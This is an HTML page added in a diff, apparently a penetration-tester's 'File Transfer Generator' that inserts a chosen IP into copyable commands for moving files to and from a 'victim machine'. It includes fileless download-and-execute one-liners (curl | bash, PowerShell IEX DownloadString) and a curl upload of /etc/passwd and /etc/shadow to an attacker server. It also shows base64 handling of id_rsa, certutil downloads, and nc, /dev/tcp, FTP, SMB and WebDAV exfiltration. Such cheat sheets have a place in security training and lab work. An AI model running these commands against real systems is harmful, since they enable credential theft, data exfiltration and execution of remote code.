@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Transfer Generator</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hack-font/3.3.0/web/hack.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --main-bg-color: #1a1a1a;
+            --card-bg-color: #2d2d2d;
+            --text-color: #e8e8e8;
+            --accent-color: #3eb0ef;
+            --accent-hover: #2a8bc9;
+            --border-color: #404040;
+            --code-bg-color: #1e1e1e;
+            --success-color: #30d158;
+            --error-color: #ff453a;
+            --warning-color: #ff9f0a;
+            --header-bg: #252525;
+            --shell-color: #50fa7b;
+            --ps-color: #bd93f9;
+            --cmd-color: #8be9fd;
+            --comment-color: #6272a4;
+            --string-color: #f1fa8c;
+            --function-color: #ff79c6;
+            --variable-color: #8be9fd;
+            --number-color: #bd93f9;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            line-height: 1.7;
+            color: var(--text-color);
+            background-color: var(--main-bg-color);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        header {
+            background: var(--header-bg);
+            padding: 2rem 0;
+            margin-bottom: 2rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .header-content {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-right: 2rem;
+        }
+
+        .logo-icon {
+            font-size: 2.5rem;
+            color: var(--accent-color);
+        }
+
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        h1 {
+            color: var(--text-color);
+            margin-bottom: 0.2rem;
+            font-size: 2.2rem;
+            font-weight: 600;
+        }
+
+        .subtitle {
+            color: #b0b0b0;
+            font-size: 1.1rem;
+        }
+
+        .input-section {
+            background-color: var(--card-bg-color);
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            border: 1px solid var(--border-color);
+        }
+
+        .input-group {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 1rem;
+        }
+
+        input[type="text"] {
+            flex: 1;
+            padding: 12px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 16px;
+            background-color: var(--main-bg-color);
+            color: var(--text-color);
+            transition: all 0.2s;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 2px rgba(62, 176, 239, 0.2);
+        }
+
+        button {
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+
+        button:hover {
+            background-color: var(--accent-hover);
+            transform: translateY(-1px);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+            padding: 8px 12px;
+            background-color: rgba(255, 69, 58, 0.1);
+            border-radius: 4px;
+            border-left: 3px solid var(--error-color);
+        }
+
+        .os-selector {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 1.5rem;
+            background-color: var(--main-bg-color);
+            padding: 6px;
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+        }
+
+        .os-btn {
+            flex: 1;
+            padding: 10px 16px;
+            background-color: transparent;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s ease;
+            color: var(--text-color);
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            opacity: 0.7;
+        }
+
+        .os-btn:hover {
+            opacity: 1;
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .os-btn.active {
+            background-color: var(--accent-color);
+            color: white;
+            box-shadow: 0 2px 8px rgba(62, 176, 239, 0.3);
+            opacity: 1;
+        }
+
+        .os-btn i {
+            font-size: 1.1rem;
+        }
+
+        .content-section {
+            display: none;
+        }
+
+        .content-section.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .operation-type {
+            margin-bottom: 2.5rem;
+            background-color: var(--card-bg-color);
+            border-radius: 10px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            border: 1px solid var(--border-color);
+        }
+
+        h2 {
+            color: var(--text-color);
+            margin-top: 0;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border-color);
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+        }
+
+        h3 {
+            color: var(--text-color);
+            margin: 1.5rem 0 1rem 0;
+            font-size: 1.25rem;
+            font-weight: 500;
+        }
+
+        .section-title {
+            color: var(--text-color);
+            margin: 1.5rem 0 1rem 0;
+            font-size: 1.25rem;
+            font-weight: 500;
+        }
+
+        .code-container {
+            position: relative;
+            margin: 1rem 0;
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--code-bg-color);
+            padding: 8px 16px;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+            border: 1px solid var(--border-color);
+            border-bottom: none;
+        }
+
+        .code-title {
+            font-size: 0.85rem;
+            color: #888;
+            font-weight: 500;
+        }
+
+        .language-badge {
+            background: var(--accent-color);
+            color: white;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            font-family: 'Hack', monospace;
+        }
+
+        .language-badge.shell { background: var(--shell-color); color: #1a1a1a; }
+        .language-badge.powershell { background: var(--ps-color); color: white; }
+        .language-badge.cmd { background: var(--cmd-color); color: #1a1a1a; }
+
+        .copy-btn {
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+            padding: 4px 8px;
+            font-size: 0.75rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: 'Hack', monospace;
+        }
+
+        .copy-btn:hover {
+            background-color: var(--border-color);
+            transform: none;
+        }
+
+        pre {
+            background-color: var(--code-bg-color);
+            border: 1px solid var(--border-color);
+            border-bottom-left-radius: 8px;
+            border-bottom-right-radius: 8px;
+            padding: 1.25rem;
+            overflow-x: auto;
+            margin: 0;
+            font-family: 'Hack', 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        code {
+            font-family: 'Hack', 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+            background-color: transparent;
+            padding: 0;
+            border-radius: 0;
+            font-size: 14px;
+            color: var(--text-color);
+        }
+
+        /* Syntax Highlighting Colors */
+        .comment { color: var(--comment-color); font-style: italic; }
+        .string { color: var(--string-color); }
+        .function { color: var(--function-color); }
+        .variable { color: var(--variable-color); }
+        .number { color: var(--number-color); }
+        .keyword { color: var(--function-color); }
+        .operator { color: var(--text-color); }
+        .builtin { color: var(--shell-color); }
+        .class { color: var(--ps-color); }
+        .property { color: var(--variable-color); }
+
+        .ip-placeholder {
+            background-color: rgba(62, 176, 239, 0.2);
+            color: var(--accent-color);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: 600;
+            border: 1px dashed rgba(62, 176, 239, 0.4);
+        }
+
+        footer {
+            text-align: center;
+            padding: 2rem 0;
+            margin-top: 3rem;
+            color: #888;
+            border-top: 1px solid var(--border-color);
+            font-size: 0.9rem;
+        }
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .logo {
+                margin-right: 0;
+                justify-content: center;
+            }
+            
+            .input-group {
+                flex-direction: column;
+            }
+            
+            .os-selector {
+                flex-direction: column;
+            }
+            
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            .container {
+                padding: 0 15px;
+            }
+            
+            .code-header {
+                flex-wrap: wrap;
+                gap: 8px;
+            }
+            
+            .os-btn {
+                padding: 12px 16px;
+            }
+        }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--main-bg-color);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <i class="fas fa-exchange-alt logo-icon"></i>
+                    <div class="logo-text">
+                        <h1>File Transfer Generator</h1>
+                        <p class="subtitle">Multi-protocol file transfer commands for Linux and Windows</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="input-section">
+            <div class="input-group">
+                <input type="text" id="ip-input" placeholder="Enter IP address (e.g., 192.168.1.100)">
+                <button id="generate-btn">Generate Commands</button>
+            </div>
+            <div class="error-message" id="ip-error"></div>
+            
+            <div class="os-selector">
+                <div class="os-btn active" data-os="linux">
+                    <i class="fab fa-linux"></i>
+                    Linux
+                </div>
+                <div class="os-btn" data-os="windows">
+                    <i class="fab fa-windows"></i>
+                    Windows
+                </div>
+            </div>
+        </div>
+
+        <!-- Linux Content -->
+        <div class="content-section active" id="linux-content">
+            <div class="operation-type">
+                <h2>Linux Downloads Operations</h2>
+                
+                <h3>bash /dev/tcp download</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Sender</span>
+cat &lt; <span class="variable">content</span> &gt; /dev/tcp/<span class="ip-placeholder">&lt;IP&gt;</span>/<span class="number">1234</span>
+
+<span class="comment"># Receiver</span>
+nc -nvlp <span class="number">4444</span> --recv-only &gt; <span class="variable">content</span></code></pre>
+                </div>
+
+                <h3>nc download</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Sender</span>
+nc <span class="ip-placeholder">&lt;IP&gt;</span> <span class="number">1234</span> &lt; <span class="variable">content</span>
+
+<span class="comment"># Receiver</span>
+nc -nvlp <span class="number">1234</span> &gt; <span class="variable">content</span></code></pre>
+                </div>
+
+                <h3>Base64 Encoding / Decoding</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Encoding the target file (it must be short storage file)</span>
+cat <span class="variable">id_rsa</span> | base64 -w <span class="number">0</span>; echo
+
+<span class="comment"># Decoding the target file</span>
+echo -n <span class="string">'aGVsbG8K='</span> | base64 -d &gt; <span class="variable">id_rsa</span></code></pre>
+                </div>
+
+                <h3>Web downloads with wget and curl</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># wget</span>
+wget https:<span class="comment">//raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</span>
+
+<span class="comment"># curl</span>
+curl -o /tmp/<span class="variable">LinEnum.sh</span> https:<span class="comment">//raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span></code></pre>
+                </div>
+
+                <h3>Fileless wget and curl downloads (direct execution)</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># curl | bash</span>
+curl https:<span class="comment">//raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash</span>
+
+<span class="comment"># wget | python3</span>
+wget -qO- https:<span class="comment">//raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3</span>
+
+<span class="string">Hello World!</span></code></pre>
+                </div>
+
+                <h3>Downloads with SCP</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code>scp <span class="variable">backupjob</span> ubuntu@<span class="ip-placeholder">&lt;IP&gt;</span>:~/</code></pre>
+                </div>
+
+                <h3>Downloads with FTP</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Start the ftp server in your machine</span>
+python -m pyftpdlib --directory=/home/juan/ftp --port=<span class="number">2121</span> --user=<span class="variable">test</span> --password=<span class="variable">test</span>
+
+<span class="comment"># Connect to the previous ftp server from the victim machine</span>
+ftp <span class="ip-placeholder">&lt;IP&gt;</span> <span class="number">2121</span>
+
+Name: <span class="variable">test</span>
+Password: <span class="variable">test</span></code></pre>
+                </div>
+            </div>
+
+            <div class="operation-type">
+                <h2>Linux Upload Operations</h2>
+                
+                <h3>bash /dev/tcp upload</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Receiver</span>
+nc -nvlp <span class="number">4444</span> --recv-only &gt; <span class="variable">content</span>
+
+<span class="comment"># Sender</span>
+cat &lt; <span class="variable">content</span> &gt; /dev/tcp/<span class="ip-placeholder">&lt;IP&gt;</span>/<span class="number">1234</span></code></pre>
+                </div>
+
+                <h3>nc upload</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Receiver</span>
+nc -nvlp <span class="number">1234</span> &gt; <span class="variable">content</span>
+
+<span class="comment"># Sender</span>
+nc <span class="ip-placeholder">&lt;IP&gt;</span> <span class="number">1234</span> &lt; <span class="variable">content</span></code></pre>
+                </div>
+
+                <h3>Base64 Encoding / Decoding</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Encoding the target file (it must be short storage file)</span>
+cat <span class="variable">id_rsa</span> | base64 -w <span class="number">0</span>; echo
+
+<span class="comment"># Decoding the target file</span>
+echo -n <span class="string">'aGVsbG8='</span> | base64 -d &gt; <span class="variable">id_rsa</span></code></pre>
+                </div>
+
+                <h3>Secure Web Upload</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># First create a certificate</span>
+openssl req -x509 -out <span class="variable">server.pem</span> -keyout <span class="variable">server.pem</span> -newkey rsa:<span class="number">2048</span> -nodes -sha256 -subj <span class="string">'/CN=server'</span>
+
+<span class="comment"># Create directory</span>
+mkdir <span class="variable">https</span> && cd <span class="variable">https</span>
+
+<span class="comment"># Start upload server</span>
+sudo python3 -m uploadserver <span class="number">443</span> --server-certificate ~/<span class="variable">server.pem</span>
+
+<span class="comment"># Upload files</span>
+curl -X POST https://<span class="ip-placeholder">&lt;IP&gt;</span>/upload -F <span class="string">'files=@/etc/passwd'</span> -F <span class="string">'files=@/etc/shadow'</span> --insecure</code></pre>
+                </div>
+
+                <h3>SSH Upload (SCP)</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code>scp test@<span class="ip-placeholder">&lt;IP&gt;</span>:/root/<span class="variable">myroot.txt</span> /your/local/path</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Windows Content -->
+        <div class="content-section" id="windows-content">
+            <!-- Windows Downloads -->
+            <div class="operation-type">
+                <h2>Windows Downloads Operations</h2>
+                
+                <h3>PowerShell Base64 Encode & Decode</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Base64 Encoding (Linux)</span>
+cat <span class="variable">content</span> | base64 -w <span class="number">0</span>; echo
+
+<span class="string">aGVsbG8=</span></code></pre>
+                </div>
+                
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge powershell">PowerShell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Base64 Decoding (PowerShell)</span>
+[<span class="class">IO.File</span>]::WriteAllBytes(<span class="string">"C:\Users\Public\content"</span>,[<span class="class">Convert</span>]::FromBase64String(<span class="string">"aGVsbG8=="</span>))</code></pre>
+                </div>
+                
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge cmd">CMD</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Alternatively with cmd</span>
+echo <span class="string">RXJlcyBnaWxpcG9sbGFzIHhkCg==</span> &gt; C:\Users\juan\Desktop\<span class="variable">content.b64</span>
+
+<span class="comment"># Certutil decode</span>
+certutil -decode C:\Users\juan\Desktop\<span class="variable">content.b64</span> C:\Users\juan\Desktop\<span class="variable">content.txt</span></code></pre>
+                </div>
+
+                <h3>PowerShell Web Downloads</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge powershell">PowerShell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># DownloadFile Method</span>
+(<span class="keyword">New-Object</span> <span class="class">Net.WebClient</span>).DownloadFile(<span class="string">'https://<span class="ip-placeholder">&lt;IP&gt;</span>/content'</span>,<span class="string">'C:\Users\Public\Downloads\content'</span>)
+
+<span class="comment"># DownloadFileAsync Method</span>
+(<span class="keyword">New-Object</span> <span class="class">Net.WebClient</span>).DownloadFileAsync(<span class="string">'https://<span class="ip-placeholder">&lt;IP&gt;</span>/content'</span>, <span class="string">'C:\Users\Public\Downloads\content'</span>)
+
+<span class="comment"># DownloadString - Fileless Method</span>
+<span class="function">IEX</span> (<span class="keyword">New-Object</span> <span class="class">Net.WebClient</span>).DownloadString(<span class="string">'https://<span class="ip-placeholder">&lt;IP&gt;</span>/content'</span>)
+
+<span class="comment"># Alternative Syntax</span>
+(<span class="keyword">New-Object</span> <span class="class">Net.WebClient</span>).DownloadString(<span class="string">'https://<span class="ip-placeholder">&lt;IP&gt;</span>/content'</span>) | <span class="function">IEX</span>
+
+<span class="comment"># Invoke-WebRequest</span>
+<span class="function">Invoke-WebRequest</span> https://<span class="ip-placeholder">&lt;IP&gt;</span>/content -OutFile <span class="variable">content</span></code></pre>
+                </div>
+
+                <h3>Certutil web download</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge cmd">CMD</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code>certutil -URLcache -split -f <span class="string">"http://<span class="ip-placeholder">&lt;IP&gt;</span>/content"</span> c:\windows\temp\<span class="variable">nc.exe</span></code></pre>
+                </div>
+
+                <h3>File Transfer with SMB</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># SMB Server Setup</span>
+sudo impacket-smbserver <span class="variable">share</span> -smb2support /tmp/<span class="variable">smbshare</span>
+
+<span class="comment"># SMB Server with Auth</span>
+sudo impacket-smbserver <span class="variable">share</span> -smb2support /tmp/<span class="variable">smbshare</span> -user <span class="variable">test</span> -password <span class="variable">test</span></code></pre>
+                </div>
+
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge cmd">CMD</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Copy from SMB</span>
+copy \\<span class="ip-placeholder">&lt;IP&gt;</span>\<span class="variable">share</span>\<span class="variable">content</span>
+
+<span class="comment"># Mount SMB Share with Auth</span>
+net use <span class="variable">n:</span> \\<span class="ip-placeholder">&lt;IP&gt;</span>\<span class="variable">share</span> /user:<span class="variable">test</span> <span class="variable">test</span>
+copy <span class="variable">n:\content</span></code></pre>
+                </div>
+
+                <h3>File Transfer with FTP</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># FTP Server Setup</span>
+sudo python3 -m pyftpdlib --port <span class="number">21</span></code></pre>
+                </div>
+                
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge powershell">PowerShell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># PowerShell FTP Download</span>
+(<span class="keyword">New-Object</span> <span class="class">Net.WebClient</span>).DownloadFile(<span class="string">'ftp://<span class="ip-placeholder">&lt;IP&gt;</span>/content'</span>, <span class="string">'C:\Users\Public\content'</span>)</code></pre>
+                </div>
+                
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge cmd">CMD</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Cmd FTP Download</span>
+echo open <span class="ip-placeholder">&lt;IP&gt;</span> &gt; <span class="variable">ftpcommand.txt</span>
+echo USER anonymous &gt;&gt; <span class="variable">ftpcommand.txt</span>
+echo binary &gt;&gt; <span class="variable">ftpcommand.txt</span>
+echo GET <span class="variable">file.txt</span> &gt;&gt; <span class="variable">ftpcommand.txt</span>
+echo bye &gt;&gt; <span class="variable">ftpcommand.txt</span>
+ftp -v -n -s:<span class="variable">ftpcommand.txt</span></code></pre>
+                </div>
+            </div>
+
+            <!-- Windows Uploads -->
+            <div class="operation-type">
+                <h2>Windows Upload Operations</h2>
+                
+                <h3>PowerShell Base64 Encode & Decode</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge powershell">PowerShell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Coding the file to base64 using PowerShell</span>
+[<span class="class">Convert</span>]::ToBase64String((<span class="function">Get-Content</span> -path <span class="string">"C:\content"</span> -Encoding byte))</code></pre>
+                </div>
+                
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Decoding the file in our machine</span>
+echo <span class="string">aGVsbG8K=</span> | base64 -d &gt; <span class="variable">content</span></code></pre>
+                </div>
+
+                <h3>PowerShell Web Uploads using Python</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Making the upload server using Python</span>
+python3 -m uploadserver
+
+<span class="comment">File upload available at /upload</span>
+<span class="comment">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span></code></pre>
+                </div>
+
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge powershell">PowerShell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># We can use either PowerShell or browser GUI</span>
+<span class="function">IEX</span>(<span class="keyword">New-Object</span> <span class="class">Net.WebClient</span>).DownloadString(<span class="string">'https://<span class="ip-placeholder">&lt;IP&gt;</span>/content'</span>)
+<span class="function">Invoke-FileUpload</span> -Uri http://<span class="ip-placeholder">&lt;IP&gt;</span>:<span class="number">8000</span>/upload -File C:\Windows\System32\drivers\etc\<span class="variable">hosts</span>
+
+<span class="comment">[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts</span>
+<span class="comment">[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373</span></code></pre>
+                </div>
+
+                <h3>PowerShell Base64 Web Upload</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge powershell">PowerShell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="variable">$b64</span> = [<span class="class">System.convert</span>]::ToBase64String((<span class="function">Get-Content</span> -Path <span class="string">'C:\content'</span> -Encoding Byte))
+<span class="function">Invoke-WebRequest</span> -Uri http://<span class="ip-placeholder">&lt;IP&gt;</span>:<span class="number">8000</span>/ -Method POST -Body <span class="variable">$b64</span></code></pre>
+                </div>
+
+                <h3>SMB Upload using WebDAV</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Hosting a WebDAV server which will act as SMB share folder</span>
+sudo wsgidav --host=<span class="number">0.0</span>.<span class="number">0.0</span> --port=<span class="number">80</span> --root=/tmp --auth=anonymous</code></pre>
+                </div>
+
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge cmd">CMD</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Upload file to WebDAV share</span>
+copy C:\Users\john\Desktop\<span class="variable">SourceCode.zip</span> \\<span class="ip-placeholder">&lt;IP&gt;</span>\DavWWWRoot\</code></pre>
+                </div>
+
+                <h3>FTP Upload</h3>
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge shell">Shell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Making the ftp server using pyftpdlib</span>
+sudo python3 -m pyftpdlib --port <span class="number">21</span> --write</code></pre>
+                </div>
+
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge powershell">PowerShell</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Uploading the target file</span>
+(<span class="keyword">New-Object</span> <span class="class">Net.WebClient</span>).UploadFile(<span class="string">'ftp://<span class="ip-placeholder">&lt;IP&gt;</span>/content'</span>, <span class="string">'C:\Windows\System32\drivers\etc\hosts'</span>)</code></pre>
+                </div>
+
+                <div class="code-container">
+                    <div class="code-header">
+                        <div class="code-title"></div>
+                        <div>
+                            <span class="language-badge cmd">CMD</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                    </div>
+                    <pre><code><span class="comment"># Alternatively with cmd</span>
+echo open <span class="ip-placeholder">&lt;IP&gt;</span> &gt; <span class="variable">ftpcommand.txt</span>
+echo USER anonymous &gt;&gt; <span class="variable">ftpcommand.txt</span>
+echo binary &gt;&gt; <span class="variable">ftpcommand.txt</span>
+echo PUT c:\windows\system32\drivers\etc\<span class="variable">hosts</span> &gt;&gt; <span class="variable">ftpcommand.txt</span>
+echo bye &gt;&gt; <span class="variable">ftpcommand.txt</span>
+ftp -v -n -s:<span class="variable">ftpcommand.txt</span></code></pre>
+                </div>
+            </div>
+        </div>
